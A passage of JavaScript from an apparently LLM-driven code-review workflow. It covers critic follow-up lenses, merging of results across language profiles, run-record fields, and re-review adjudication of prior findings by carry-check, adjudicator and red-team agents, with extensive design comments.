Also note in one line anything else likely missed (a changed file no finding touched, a claim left unverified). If coverage is complete, return missingLenses: [] and notes: "coverage complete".`,
      { label: `critic:${profile.id}`, phase: 'Synthesize', schema: CRITIC_SCHEMA, effort: 'low' },
    )
    profileCriticNotes = critic?.notes ?? ''
    // `admittedLens()` gates HERE too, and this is the fourth road into the plan, not a redundant check:
    // `candidates` is by construction the lenses NOT selected, so the whole optional set is in it.
    // The critic is the same model whose hands this project deliberately took the spend out of
    // ("the scout classifies, the code budgets"); letting it re-order lenses on the synthesis phase
    // would return that spend through a side door and undo the boundary. The signal is not thrown
    // away — a refused name is carried to the reader as an uncovered surface, with how to buy it.
    const named = (critic?.missingLenses ?? []).filter((/** @type {string} */ l) => candidates.includes(l))
    const followups = refuseCriticNames(named)
    if (followups.length && (!budget.total || budget.remaining() > 60000)) {
      await criticFollowups(followups)
    } else if (followups.length) {
      profileNotRun.push(`${profile.id} critic follow-up lenses (${followups.join('/')})`)
      log(`Budget low (~${Math.round(budget.remaining() / 1000)}k left) — SKIPPED [${profile.id}] critic follow-up lenses. Review marked INCOMPLETE.`)
    }
  }
  // The critic's names the optional request or the surface gate refuses, recorded as uncovered; the rest are follow-ups.
  /** @param {string[]} named @returns {string[]} */
  function refuseCriticNames(named) {
    for (const l of named) if (!admittedLens(l)) optionalNamedByCritic.add(l)
    const refusedOptional = named.filter((/** @type {string} */ l) => !admittedLens(l))
    if (refusedOptional.length) log(`[${profile.id}] Completeness critic named optional lens(es) ${refusedOptional.join(', ')} — NOT dispatched (the optional pass is bought by an explicit \`optional=\` request); reported as uncovered.`)
    // realm @nick/craft #102: the surface gate BINDS the critic too, mirroring `admittedLens()` above and
    // for the same reason. `candidates` is by construction the lenses NOT in the plan, so a lens the
    // gate dropped is in it — and re-dispatching it here would buy back exactly the whole-repo lens the
    // diff's absent surface said not to run, while `surfaceGateSection()` still reported it "not run"
    // (the report would then LIE). `surfaceDropped` is the PER-PROFILE drop list, so a lens dropped in
    // this profile does not wrongly suppress another profile's critic. A named-and-dropped lens is
    // refused, carried to the reader as an uncovered surface, and kept out of the follow-up set.
    for (const l of named) if (surfaceDropped.includes(l)) surfaceGateNamedByCritic.add(l)
    const refusedSurface = named.filter((/** @type {string} */ l) => surfaceDropped.includes(l))
    if (refusedSurface.length) log(`[${profile.id}] Completeness critic named surface-gated lens(es) ${refusedSurface.join(', ')} — NOT dispatched (the diff does not touch the surface their defect class needs); reported as uncovered.`)
    return named.filter((/** @type {string} */ l) => admittedLens(l) && !surfaceDropped.includes(l))
  }
  /** @param {string[]} followups */
  async function criticFollowups(followups) {
    log(`[${profile.id}] Completeness critic → follow-up lenses: ${followups.join(', ')}`)
    criticFollowupLenses = [...followups]
    const priorSummary = `Earlier lenses already produced ${pool.length} findings — do NOT repeat them; surface only what your lens would add.`
    // A SILENT REFUSAL NEXT TO A LOUD ONE. `.filter(Boolean)` used to swallow a follow-up lens that
    // DIED — no notRun entry, no INCOMPLETE — while the branch two lines below, where the same lens
    // is skipped for lack of budget, records both. "The critic said run it and it died" is not a
    // cleaner outcome than "the critic said run it and there was no budget"; it is the same hole in
    // coverage, and the one a re-run can actually fix.
    const settledExtra = await parallel(followups.map((/** @type {string} */ lens) => () =>
      runLens(lens, lensPrompt(lens, priorSummary, profile, plan), 'Synthesize', ' (critic)'),
    ))
    const deadFollowups = followups.filter((/** @type {string} */ _l, /** @type {number} */ i) => !settledExtra[i])
    if (deadFollowups.length) {
      profileNotRun.push(...deadFollowups.map((/** @type {string} */ l) => `${profile.id} critic follow-up lens ${l} — dispatched and returned no findings (died, or answered off-schema)`))
      log(`⚠️ [${profile.id}] critic follow-up lens(es) ${deadFollowups.join('/')} died before returning findings — recorded as not run; the review is INCOMPLETE`)
    }
    // `source` is the lens the engine dispatched, never the model's own label: the severity floor
    // and every source-keyed rule read it, as on the lens-round path.
    const extra = settledExtra.flatMap((r, i) => (r == null ? [] : (r.findings || []).map(f => ({ ...f, source: /** @type {string} */ (followups[i]) }))))
    const fresh = extra.filter(f => { const k = key(f); if (seen.has(k)) return false; seen.add(k); return true })
    if (fresh.length) {
      const v = await verifyPool(await dedupPool(applyPathFloor(fresh), profile), plan, profile, toolProvenance)
      profileNotRun.push(...(v.notRun || []))
      profileSavedByFloor = profileSavedByFloor.concat(v.savedByFloor || [])
      profileConfirmed = profileConfirmed.concat(v.confirmed)
      profileSuspected = profileSuspected.concat(v.suspected)
      profileUnverified = profileUnverified.concat(v.unverified)
      profileDropped += v.dropped
      refuted = refuted.concat(v.refuted)
      log(`[${profile.id}] Critic follow-up: +${v.confirmed.length} confirmed · +${v.suspected.length} suspected · ${v.dropped} refuted · +${v.unverified.length} not verified`)
    }
  }
  let profileCriticNotes = ''
  await completenessCritic()

  return { profile, plan, surfaceDropped, optionalScope, ranLenses, lensRounds, criticFollowupLenses, gateStatus, gateProvenance, failedChecks, carriedChecks, confirmed: profileConfirmed, suspected: profileSuspected, unverified: profileUnverified, dropped: profileDropped, refuted, notRun: profileNotRun, savedByFloor: profileSavedByFloor, criticNotes: profileCriticNotes, probeViolations }
}

// ================= Run each active profile, then merge =================
async function reviewActiveProfiles() {
  for (const p of active) results.push(await reviewProfile(p))
}
await reviewActiveProfiles()

// A red gate on any active language blocks the whole review (findings can't be trusted on a broken tree).
const gateFailed = /** @type {Result[]} */ (failedProfiles(results))
const runGate = gateRecord(results)
const mergedProvenance = runGate.provenance
const mergedGateStatus = runGate.status

// carriedChecks prints on EVERY verdict, red or green. A red-but-not-yours check that only appeared
// on failure would be invisible exactly when the review passes — which is most of the time, and is
// precisely when a dependency backlog quietly grows.
function carriedSection() {
  const all = results.flatMap(r => (r.carriedChecks || []).map(c => `- [${r.profile.id}] ${c}`))
  return all.length
    ? `\n## Pre-existing — reported, not blocking\nThese are real and RED, but this diff did not cause them and no edit to the changed files clears them:\n${all.join('\n')}\n`
    : ''
}

// The synthesis agent writes the main report; a section it is not told about simply does not exist.
const carriedLine = (() => {
  const all = results.flatMap(r => (r.carriedChecks || []).map(c => `[${r.profile.id}] ${c}`))
  return all.length
    ? ` Then a \`## Pre-existing — reported, not blocking\` section listing these VERBATIM, one per line — they are RED and real but this diff did not cause them, so they must appear in the report while changing NOTHING about the verdict: ${JSON.stringify(all)}.`
    : ''
})()

// A short, stable digest of a text, for recording WHAT a round was given without carrying the text.
/** @param {string} text */
function digest(text) {
  return [...String(text ?? '')].reduce((h, c) => ((h * 31) + c.charCodeAt(0)) >>> 0, 7).toString(16)
}

/** @param {Record<string, unknown>} extra */
function reviewRecord(extra) {
  return {
    schemaVersion: 1,
    runtime: 'claude-code',
    craftVersion: CRAFT_VERSION,
    kind: 'workflow',
    name: 'review',
    nested: !!viaArg,
    via: viaArg || null,
    // What the recall step brought, or why none (realm @nick/craft, node #40).
    memory: memoryRecord(memory),
    branch, head,
    languages: active.map(p => p.id),
    uncoveredFiles,
    // Each round's verified yield rides beside its cost; gate seeds (round 0) in `seedYield`, not as a round entry, with the confirmed
    // findings no round produced beside them (realm @nick/craft, node #248).
    lensRounds: results.flatMap(r => lensRoundYield(r.lensRounds || [], r['confirmed'], r['suspected']).map(x => ({ language: r.profile.id, ...x }))),
    seedYield: results.map(r => ({ language: r.profile.id, ...roundYield(0, r['confirmed'], r['suspected']), unattributedConfirmed: unattributedCount(r['confirmed']) })),
    scout: results.map(r => ({ language: r.profile.id, size: r['plan'].sizeBucket, lenses: r['plan'].lenses, model: r['plan'].lensModel, maxRounds: r['plan'].maxRounds, verifyVotes: r['plan'].verifyVotes, securitySensitive: !!r['plan'].securitySensitive, isLibrary: !!r['plan'].isLibrary })),
    gate: runGate,
    // The optional pass, on the record: `skipped` is the field that keeps a cheap run from reading
    // later — in analyze-runs, in a comparison between two runs — as a full one.
    optionalPass: { requested: optionalRequested, ...optionalTally(), namedByCritic: [...optionalNamedByCritic] },
    // realm @nick/craft #102: surfaceGate recorded for later analyze-runs measurement. Mirrors
    // optionalPass so a cheap surface-gated run does not read later as one that never planned those
    // whole-repo lenses: `dropped` is the load-bearing field, `namedByCritic` the lenses the
    // completeness critic flagged that the gate deliberately kept dropped. Built by surfaceGateRecord
    // from the per-profile `surfaceDropped`: only profiles past their mechanical gate count (a red
    // profile's drops were never in play), and a lens dropped in one profile but dispatched in
    // another (a mixed-diff run) is not counted as saved — the same set surfaceGateSection() prints.
    // Run-level across profiles (same scope as optionalPass), sorted and unique. `dispatched` is read
    // directly off `surfaceGateDispatched` — the same dispatch-point Set the saving subtracts, and the one source that survives the
    // gateFailed early-exit — so analyze-runs can compute a share (saved / (saved + dispatched))
    // without trusting the per-profile `dimensions` snapshot, which does not.
    surfaceGate: surfaceGateRecord(results, { dispatched: surfaceGateDispatched, namedByCritic: surfaceGateNamedByCritic }),
    // Every breach of the preflight probe budget, per language. Recorded on EVERY run, clean or
    // not: the point of the audit is that the next drift back into CI archaeology shows up in the
    // record of the run that did it, not in a re-measurement months later.
    preflightProbeViolations: results.flatMap(r => (r['probeViolations'] || []).map((/** @type {string} */ v) => `[${r.profile.id}] ${v}`)),
    // realm @nick/craft #104: did re-review memory engage this run, and if not, why. `chained` is false
    // with reason 'no-branch' on a detached HEAD — the silent round-1 degradation this field makes
    // legible in the record (the operator-facing half is reReviewMemorySection() in the report).
    reReview: { chained: reReview.chained, reason: reReview.reason, basisVerdict: priorBasisVerdict, basisMismatch: priorBasisMismatch, basisOverridesLogger, fpComparable: priorFpComparable, tombstonesDropped: tombstonesDroppedForBasis, ledgerDegraded: priorLedgerDegraded, journalSourced: priorRoundJournalSourced, priorRound: priorRound?.['round'] ?? null, priorHead: priorRound?.['head'] ?? null },
    // What the lenses were run over and how, so a later comparison of two rounds can tell a memory
    // effect from a scope or configuration effect (lib/round-pairs.mjs, realm @nick/craft #97): a
    // `delta` round on an unchanged head reviews an empty diff.
    lensScope: fullRescan ? 'full' : 'delta',
    strict,
    fullEvery,
    ...depthRecordFields(),
    // One name and one shape with rust-audit, keyed by agent type (lib/agent-fallback.mjs, realm @nick/craft #151).
    ...agentUnavailableRecord(reviewerAgentUnavailable.map(x => x.agent),
      Object.entries(reviewerAgentFallbacks).map(([id, count]) => ({ agent: reviewerAgentNames[id] || id, count }))),
    // Against which base and path the diff was taken, which lenses the critic added on top of the plan,
    // and a digest of the caller's intent text (it feeds the intent lens) — all of which change what a
    // round costs without being memory (lib/round-pairs.mjs, realm @nick/craft #97).
    base: baseRef || '',
    path: pathArg || '',
    criticFollowups: results.flatMap(r => (r['criticFollowupLenses'] || []).map((/** @type {string} */ l) => `${r.profile.id}:${l}`)).sort(),
    intentDigest: digest(intentArg),
    // The author's description that reaches every lens (PR title/body or commit messages), and the
    // changed-file set the diff was taken over — both fetched each round, both change what a round does.
    specDigest: digest(spec),
    filesDigest: digest([...changedFiles].sort().join('\n')),
    outputTokens: budget.spent(),
    ...extra,
  }
}

async function gateFailedExit() {
  await logRun(reviewRecord({ verdict: 'Block', round: thisRound, findings: summarizeFindings([]), dimensions: [], verification: null, notRun: [...scopeNotRun, ...extraLensesNotRun('the mechanical gate is red')], failedChecks: gateFailed.flatMap(r => (r.failedChecks || []).map((/** @type {string} */ c) => `[${r.profile.id}] ${c}`)) }))
  return out([
    `## Verdict`,
    `⛔ Block — mechanical gate is red (${gateFailed.map(r => r.profile.id).join(', ')}).`,
    ``,
    `## Gate`,
    mergedProvenance,
    `\nFailed checks:\n${gateFailed.flatMap(r => (r.failedChecks || []).map((/** @type {string} */ c) => `- [${r.profile.id}] ${c}`)).join('\n')}`,
    carriedSection(),
    scopeSection(),
    ``,
    `Fix the gate before a semantic review is worthwhile.`,
  ].join('\n'))
}
if (gateFailed.length) return await gateFailedExit()

let confirmed = results.flatMap(r => r['confirmed'])
let suspected = results.flatMap(r => r['suspected'])
// Low/Info nothing looked at. A third track, not a corner of Suspected — see verifyPool.
let unverified = results.flatMap(r => r['unverified'] || [])

// ---- Adjudicate track (re-review only) ----
// For each prior-round finding, decide its fate this round. Settled priors (isSettledPrior) are carried
// (not re-raised) unless the code around them changed; open/confirmed priors, and a Critical/High
// deferred one, get a targeted "is it still here?" check against the current tree.
// `retired` is the carried track's EXIT: a dismissed prior whose carry-check reported the code
// around it unchanged has had its one confirmation and leaves the ledger. It still lives here for
// the rest of THIS round — it suppresses a lens re-discovery (below) and renders in the report's
// carried section — but it is not re-persisted, so it never costs another carry agent.
/** @type {{ resolved: Finding[], stillOpen: Finding[], regressed: Finding[], carried: Finding[], retired: Finding[] }} */
const adjudicated = { resolved: [], stillOpen: [], regressed: [], carried: [], retired: [] }
// Tombstones: resolved/retired priors from EARLIER rounds, kept only as a recidivism check (a fresh
// finding matching one is a regression, not a novelty). Filled on load below and read again at the
// absorption pass — declared out here so both see it. It rides the persisted ledger like any row, so
// a lost tombstone is caught by the same ledgerCount check every other row is.
/** @type {LedgerAnswer[]} */
const priorTombstones = []
/** Priors carrying the unverified tier re-enter this round's unverified track. @param {Finding[]} priorUnverified @param {PriorRound} priorRoundIn */
function carryUnverifiedPriors(priorUnverified, priorRoundIn) {
  if (priorUnverified.length) {
    log(`${priorUnverified.length} prior finding(s) carry the unverified tier — never checked against the code, so nothing to adjudicate: carried forward as unverified rather than promoted to still-open`)
    unverified = unverified.concat(priorUnverified.map((/** @type {Finding} */ f) => ({
      ...f,
      fix: f['fix'] || 'verify it first — nothing has checked this claim against the code',
      blastRadius: f['blastRadius'] || '',
      tier: 'unverified',
      // Flagged so the tracking pass below can use these as HOSTS. They are not in `livePriors` —
      // they were never adjudicated — so without the flag a fresh unverified re-discovery of the
      // same site is neither marked nor collapsed, and the site gains a ledger row every round.
      carriedUnverified: true,
      why: `${baseWhy(f['why'])} (STILL NOT VERIFIED: carried from round ${priorRoundIn['round']}, where no verifier judged it; nothing has checked it against the code since)`,
    })))
  }
}
// THE ONE RULE for a settled prior — the carry track's entry. A dismissal (rejected/justified) is the
// author's; a `deferred` row is a finding set aside as Known and deferred (realm @nick/craft, node #204),
// settled for the chain like a dismissal so it stays out of the verdict — except Critical/High, which no
// prior record sets aside, and except a deferral a record in hand (recalled or passed) releases by an
// explicit `supersedes:` / `answers:` link to its question; its question's absence never releases it
// (deferralReleased). The deferral is the row's structured `deferral` field; a `deferred` row without one
// has no question behind it (none was written, or the write was refused), so nothing holds it.
// Released, it is an ordinary prior: adjudicated, counted while its defect is present.
/** @param {Finding} f */
function deferralHeld(f) {
  const deferral = deferralOn(f['deferral'])
  if (!deferral) {
    log(`Re-review: ${f['file']}:${f['line']} is marked deferred but carries no question's deferral — adjudicated like any prior`)
    return false
  }
  if (reraisedBySeverity(f['severity'])) return false
  if (!deferralReleased(deferral, priorDecisionsIn.decisions)) return true
  log(`Re-review: the deferral on ${f['file']}:${f['line']} no longer holds — a record supersedes or answers its question ${deferral.id} — adjudicated like any prior`)
  return false
}
/** @param {Finding} f */
function isSettledPrior(f) {
  const d = f['disposition']
  return d === 'rejected' || d === 'justified' || (d === 'deferred' && deferralHeld(f))
}
/** Carried deferred priors, for the Known and deferred section. */
const carriedDeferred = () => adjudicated.carried.filter(f => f['disposition'] === 'deferred').map(f => ({ ...f, priorKind: 'question' }))
// The adjudicate track, on a re-review with a prior ledger.
async function adjudicatePriors() {
  if (priorRound?.['ledger']?.length) {
    phase('Adjudicate')
    // Canonicalize prior severity ONCE, at the load boundary, BEFORE splitting/adjudicating/carrying:
    // LEDGER_ITEM.severity has no enum, so a drifted `critical`/`CRITICAL` prior would trip the
    // case-insensitive gates (isHighSeverity in classifyRedTeam / the red-team gate) yet be bucketed as
    // 0 Critical/0 High by countBySeverity (exact-case) — a fail-open re-review Approve over a
    // still-broken Critical fix. Mapping through canonicalSeverity here means adjudicateOne's
    // `located = {...f}` and EVERY downstream verdict/count (countBySeverity, rereviewVerdict, the strict
    // escalation) and the re-persisted ledger all see canonical severity for priors.
    const priorLedgerAll = priorRound['ledger'].map(f => ({ ...f, severity: canonicalSeverity(f['severity']) }))
    // TOMBSTONES ARE CARVED OUT BEFORE THE SPLIT. A `disposition:'closed'` row is a resolved/retired
    // prior kept only so a later round can recognise the defect's return — it is already answered.
    // Left in the pool it would fall into `toCheck` below and be sent to the adjudicator, spending an
    // agent to ask whether a closed defect is "still present" at a site where nothing remains to judge.
    // So it is pulled here and never enters the unverified/settled/toCheck partitions.
    priorTombstones.push(...priorLedgerAll.filter((/** @type {Finding} */ f) => f['disposition'] === 'closed'))
    const priorLive = priorLedgerAll.filter((/** @type {Finding} */ f) => f['disposition'] !== 'closed')
    // THE UNVERIFIED TIER SURVIVES THE ROUND BOUNDARY. A prior carrying `tier: 'unverified'` was never
    // checked against the code — so there is nothing to adjudicate: "is the defect still present?"
    // presumes someone established it was present. Adjudicating it anyway routed it into `stillOpen`,
    // where it renders as a live prior finding AND feeds the verdict (`rereviewVerdict` counts
    // stillOpen) — so a finding no verifier ever looked at became a gating one after one hop, and the
    // tier that exists to say "nothing checked this" lived only inside the round that minted it.
    // It re-enters THIS round's own unverified track instead: label kept, out of the verdict, out of
    // the refutation denominator, re-persisted as `unverified` for the next round.
    const priorUnverified = priorLive.filter((/** @type {Finding} */ f) => String(f['tier'] || '') === 'unverified')
    carryUnverifiedPriors(priorUnverified, priorRound)
    const priorLedger = priorLive.filter((/** @type {Finding} */ f) => String(f['tier'] || '') !== 'unverified')
    // Judged once per prior (a released deferral is logged): toCheck is the remainder, not a second pass.
    const settled = priorLedger.filter(isSettledPrior)
    /** @type {Finding[]} */
    const toCheck = priorLedger.filter(f => !settled.includes(f))

    // Settled priors: carried unless the code around them changed since the prior round.
    const carriedResults = (await parallel(settled.map((/** @type {Finding} */ f) => () => {
      const pf = promptFields(f)
      return ragent(
        `A prior review finding was set aside by the author (disposition: ${f['disposition']}). Decide only whether the CODE AROUND IT CHANGED since commit ${flattenField(priorRound['head'])}. Shell + read only.
FINDING: [${pf.severity}] ${pf.title} — at ${pf.file}:${f['line']} (symbol ${pf.symbol}), rule ${pf.ruleId}.
Run \`git diff ${priorRound.head ? `${shq(priorRound.head)}...HEAD` : 'HEAD'} -- ${shq(f.file)}\` and judge whether the enclosing symbol/region was touched. Return {changed: <bool>, reason}.`,
        { label: `carry:${f['file']}:${f['line']}`, phase: 'Adjudicate', schema: CHANGED_SCHEMA, model: CULL_MODEL },
      ).then(r => ({ f, changed: r == null ? null : !!r.changed }))
    }))).filter(x => x != null)
    // A dead carry agent (changed == null) is indeterminate — keep the dismissed prior as carried (do
    // NOT reopen on an indeterminate carry), but count + ⚠️-log it like the other death paths so this
    // is no longer the one unaudited death path.
    //
    // THE EXIT, AND WHY IT LOSES NOTHING. A dismissal is the author's decision; the only thing that
    // can invalidate it is the code around it changing. So one carry-check that says "unchanged" is
    // the whole answer, and re-asking it every round forever buys nothing — it was the only track
    // with no exit at all, costing one agent per dismissal per round in perpetuity. A retired prior
    // is not forgotten into silence: the lenses raise the finding fresh, on its merits — which is
    // exactly what the `changed === true` branch does here, minus the stale `rejected` label.
    //
    // WHEN THE RE-RAISE HAPPENS, HONESTLY. Not only "if that code is ever touched again". On a full
    // re-scan the lenses see the whole diff and re-invent every prior, so the re-discovery can land in
    // the SAME round the dismissal retires: partitionAbsorbed refuses to absorb into a retired host
    // (it is not persisted), the finding is KEPT, and it enters the next ledger as `open`. The
    // author's dismissal is then undone with no code change, and next round it costs a full
    // adjudicator instead of a cheap carry agent.
    //
    // THAT IS THE ACCEPTED COST, AND THE ALTERNATIVE IS WORSE. Dropping a finding whose only carrier
    // retired would reinstate exactly the loss class partitionAbsorbed exists to close: retirement is
    // judged at REGION granularity while the carrier matches on file+ruleId, so a genuinely NEW defect
    // elsewhere in the same file under the same rule would be discarded by a host whose own region did
    // not move — silently, into no report and no ledger. Losing a label is recoverable (the author
    // re-dismisses it, once); losing a defect is not.
    //
    // An INDETERMINATE carry-check (agent died) retires nothing: it stays carried and is asked again
    // next round.
    let carryDied = 0
    /** @param {(typeof carriedResults)[number]} c */
    const applyCarry = c => {
      const { f, changed } = c
      if (changed === null) { carryDied++; log(`⚠️ carry-check for ${f.file}:${f.line} died — kept as carried by default`); adjudicated.carried.push(f) }
      // A deferred prior is a known DEFECT, not a dismissal: its code changed, the question is whether the
      // defect is still there — the adjudicator's (resolved → tombstone; still present → open, counted).
      // Reopening it unseen reported a fixed defect as open.
      else if (changed && f['disposition'] === 'deferred') toCheck.push(f)
      else if (changed) adjudicated.stillOpen.push({ ...f, why: `${baseWhy(f.why)} (reopened: dismissed as ${f.disposition}, but the code around it changed — re-verify the justification)` })
      // Unchanged, a deferred prior stays carried (and deferred) until it is answered, instead of
      // retiring after one confirmation.
      else if (f['disposition'] === 'deferred') adjudicated.carried.push(f)
      else adjudicated.retired.push(f)
    }
    for (const c of carriedResults) applyCarry(c)

    // Open/deferred/confirmed priors: is the defect CLASS still present at its (re-located) site?
    // The adjudicator must state the violated invariant and attack the fix — a fix that closes the
    // literal repro but not the class must not close. A "resolved" Critical/High is then re-attacked
    // by an independent red-team agent that never sees the adjudicator's verdict.
    const adjudModel = results[0]?.['plan']?.lensModel || 'opus'
    let overturned = 0
    let redTeamDied = 0
    let invalidRedTeam = 0
    let adjudicatorDied = 0
    let cannotTellCount = 0
    const redTeam = async (/** @type {Finding} */ f, /** @type {AdjudicateAnswer} */ adj) => {
      if (!isHighSeverity(f['severity'])) return adj
      const pf = promptFields(f)
      const rt = await ragent(
        `A code-review finding was raised on an earlier revision of this repo and the author has since pushed fix commits. Attack the fix. Shell + read only; do NOT hunt for unrelated bugs.
FINDING: [${pf.severity}] ${pf.title}
  originally at ${pf.file}:${f['line']} (enclosing symbol ${pf.symbol}), rule ${pf.ruleId}
  why it mattered: ${sanitizeAttack(withoutAbsorbed(f.why))}${absorbedPromptBlock(f.why)}
INVARIANT it violated: ${redTeamInvariant(adj, f)}
METHOD: re-locate the symbol (grep it — the line has likely moved), read the current code, and try to CONSTRUCT a concrete input/state that violates the invariant even with the current code in place (canonical: the fix compares for exact equality where the invariant is about overlap/containment/ordering). Check every candidate against the actual code paths before claiming it works.
Return {defeated, attack} — defeated=true ONLY with a concrete attack that survives your own check against the code.`,
        { label: `redteam:${f['file']}:${f['line']}`, phase: 'Adjudicate', schema: ATTACK_SCHEMA, model: adjudModel },
      )
      // A dead red-teamer keeps `resolved`: the adjudicator already ran its own attack pass, and a
      // transient agent death must not spuriously reopen findings. But the degradation must be
      // auditable — count it, log it, and annotate the note so "red-team passed" is distinguishable
      // from "red-team never ran" in the report and the run log.
      const { adj: redTeamed, died, overturned: ov, invalid } = classifyRedTeam(f, adj, rt)
      if (died) { redTeamDied++; log(`⚠️ red-team for ${f['file']}:${f['line']} died — "resolved" stands on the adjudicator's own attack pass only`) }
      if (invalid) { invalidRedTeam++; log(`⚠️ red-team for ${f['file']}:${f['line']} claimed defeat with NO attack — invalid verdict discarded, keeping resolved`) }
      if (ov) overturned++
      return redTeamed
    }
    const checkResults = (await parallel(toCheck.map((/** @type {Finding} */ f) => () => {
      const pf = promptFields(f)
      return ragent(
        `You are adjudicating whether a prior review finding is still present after a fix attempt. Load the ${/** @type {Profile} */ (active[0]).rubricSkill} skill for the rubric. Shell + read only; do NOT hunt for new bugs.
FINDING: [${pf.severity}] ${pf.title}
  originally at ${pf.file}:${f['line']} (enclosing symbol ${pf.symbol}), rule ${pf.ruleId}
  why it mattered: ${sanitizeAttack(withoutAbsorbed(f.why))}${absorbedPromptBlock(f.why)}
METHOD:
  1. State in ONE sentence the INVARIANT this finding violated — the property that must hold, not the literal repro (derive it from the why/title).
  2. Re-locate the symbol (grep it — the line has likely moved) and read the fix.
  3. Construct AT LEAST TWO concrete attacks: inputs/states that would violate the invariant while the current fix is in place (canonical: the fix compares for exact equality where the invariant is about overlap/containment/ordering). Check each against the actual code.
  4. Decide:
  - "resolved": every attack fails — the fix closes the CLASS, not just the described instance.
  - "still-open": the defect is still present OR one of your attacks succeeds (cite the current file:line; put the attack in \`attack\`).
  - "cannot-tell": you could NOT determine the answer — the file is gone or renamed, the symbol no longer exists, or you could not read enough of the code to judge. Say why in \`note\`. Use this rather than "resolved" whenever you are guessing: "resolved" means you checked and every attack failed, never "I could not find it".
  - "regressed": the site was changed but now has a DIFFERENT defect of the same kind (cite it).
Return {status, currentLine, note, invariant, attack}.`,
        { label: `adjudicate:${f['file']}:${f['line']}`, phase: 'Adjudicate', schema: ADJUDICATE_SCHEMA, model: adjudModel },
      ).then(async r => ({ f, r: r && shouldRedTeam(r) ? await redTeam(f, r) : r }))
    }))).filter(x => x != null)
    /** @param {(typeof checkResults)[number]} c */
    const tallyAdjudication = c => {
      const { f, r } = c
      const { track, entry, demoted, cannotTell, adjudicatorDied: adjDied } = adjudicateOne(f, r)
      if (demoted) log(`⚠️ adjudicator for ${f.file}:${f.line} returned resolved WITH an attack — demoting to still-open`)
      if (cannotTell) { cannotTellCount++; log(`⚠️ adjudicator for ${f.file}:${f.line} could not tell — kept still-open, marked UNVERIFIED in the report`) }
      if (adjDied) { adjudicatorDied++; log(`⚠️ adjudicator for ${f.file}:${f.line} died — no verdict returned; kept still-open by default`) }
      adjudicated[track].push(entry)
    }
    for (const c of checkResults) tallyAdjudication(c)
    log(`Adjudicate: ${adjudicated.resolved.length} resolved · ${adjudicated.stillOpen.length} still-open · ${adjudicated.regressed.length} regressed · ${adjudicated.carried.length} carried · ${adjudicated.retired.length} carried→retired (code unchanged; leaves the ledger) · ${overturned} overturned by red-team · ${redTeamDied} red-team died · ${invalidRedTeam} invalid red-team · ${adjudicatorDied} adjudicator died · ${cannotTellCount} could not tell · ${carryDied} carry died`)
  }
}
await adjudicatePriors()

// On a re-review, lenses can re-surface a finding that is already tracked on the adjudicate track —
// always on a full re-scan (the lenses saw the whole diff), and even on the delta path when a fix
// commit touches a still-open site. A new finding already carried by a still-LIVE prior
// (still-open/regressed/carried/retired) is ABSORBED into that prior rather than listed separately,
// so it is not double-counted in the report or appended to the persisted ledger — the append is what
// made the carried set, and therefore the per-round adjudicator bill, grow every round.
// ABSORBED IS NOT DISCARDED: the finding is recorded onto its host's `why` (absorbInto), a persisted
// ledger field, so it outlives the round the host RESOLVES and leaves the ledger — the failure mode
// the old comment named as future and which was in fact already live. The match is file+ruleId
// (findCarrier); the reasoning for that coarseness is in lib/review-adjudicate.mjs. matchesPrior is
// the fallback for a finding with no ruleId to key on.
// Do NOT dedup against RESOLVED priors: a new finding matching a resolved one is a regression signal
// and must survive.
/** The judged tracks' findings absorbed into the still-live priors they repeat. @param {Finding[]} livePriors @param {Set<Finding>} retired */
function absorbIntoLivePriors(livePriors, retired) {
  // A RETIRED host absorbs NOTHING — it is not persisted, so a clause on it would leave the
  // absorbed report in no report and no ledger. partitionAbsorbed keeps those findings instead;
  // the reasoning (and why the granularity mismatch makes this the loss class the design set out
  // to close) is in lib/review-adjudicate.mjs.
  // ONE threaded accumulation across both tracks, not two independent ones: the tracks share
  // hosts (the carrier key is file+ruleId, orthogonal to the confirmed/suspected split), and two
  // independent partitions would each compute their clause from the same un-absorbed `host.why`,
  // so applying them afterwards would drop one report entirely — into no track, no host and no
  // ledger. absorbAcross returns the cumulative `updates`; it is applied once.
  // ONLY the JUDGED tracks are absorbed. An unverified finding may not be written onto a prior's
  // `why`: that clause tells the next adjudicator that "resolved" requires the absorbed report to
  // be gone, which lets something nothing ever checked hold a prior open and gate the re-review
  // verdict — the exact substitution the unverified tier exists to end, and it carries a dead
  // verifier's Critical/High, not just an unpaid-for Low. It is marked in place instead
  // (markTrackedUnverified), so it neither disappears into the prior nor gates anything.
  const { runs, updates, absorbed, keptAtRetired } = absorbAcross([confirmed, suspected], livePriors, retired, matchesPrior)
  for (const [host, why] of updates) host.why = why
  // Two lists in, two runs out — absorbAcross returns one run per list, in order.
  confirmed = /** @type {(typeof runs)[number]} */ (runs[0]).kept
  suspected = /** @type {(typeof runs)[number]} */ (runs[1]).kept
  if (absorbed) log(`Re-review: absorbed ${absorbed} new finding(s) into a still-live prior at the same file+rule — recorded on the prior's why (and delivered to next round's adjudicator as its own prompt lines) so they outlive it, not listed twice`)
  if (keptAtRetired) log(`Re-review: ${keptAtRetired} new finding(s) matched a prior that RETIRED this round — kept as findings rather than absorbed into a host that does not reach the next ledger`)
}
/** Unverified findings at a site a live prior tracks: marked, or collapsed onto an unverified prior. @param {Finding[]} trackingHosts @param {Set<Finding>} retired @param {Finding[]} carriedUnverified */
function trackUnverifiedAtPriors(trackingHosts, retired, carriedUnverified) {
  const tracked = markTrackedUnverified(unverified.filter(f => !f.carriedUnverified), trackingHosts, retired, matchesPrior)
  unverified = tracked.kept.concat(carriedUnverified)
  // A COLLAPSED ROW IS NOT A DISCARDED FINDING. The carrier key is file+ruleId, coarser than a
  // site, so the row dropped from the ledger can be a genuinely distinct defect on another line.
  // Its site is written onto the host through the same bounded clause absorption uses; the reason
  // this is not the obligation absorption was refused for is in lib/review-adjudicate.mjs.
  // WHAT "BOUNDED" MEANS HERE, EXACTLY: the bound is ABSORBED_MAX and it is GLOBAL, not per round.
  // At most three sites are ever NAMED on one host's `why`; a fourth and every later one — in this
  // round or any later one — is traded for the overflow counter, so its line, title and rationale
  // do not reach the next ledger. That is not a lost finding: it is in THIS round's report, the
  // counter keeps "more than one defect sits here" true, and the lenses re-raise the site next
  // round. It is a loss of detail, and the cap is deliberate (absorbInto's clause is re-interpolated
  // into every later prompt) — but it is a cap, so do not read the clause as a per-site record.
  // OPEN, AND DELIBERATELY NOT CLOSED HERE: an unverified row has no exit from the ledger, so its
  // `why` still accretes across rounds through the per-round NOT_VERIFIED suffixes, which have no
  // cap of their own. The growth is of one persistent field, and bounding it is its own work.
  for (const [host, why] of tracked.updates) host.why = why
